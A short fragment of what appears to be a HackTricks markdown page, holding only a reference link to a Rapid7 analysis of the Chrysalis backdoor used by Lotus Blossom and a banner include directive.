- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)


{{#include ../../../banners/hacktricks-training.md}}
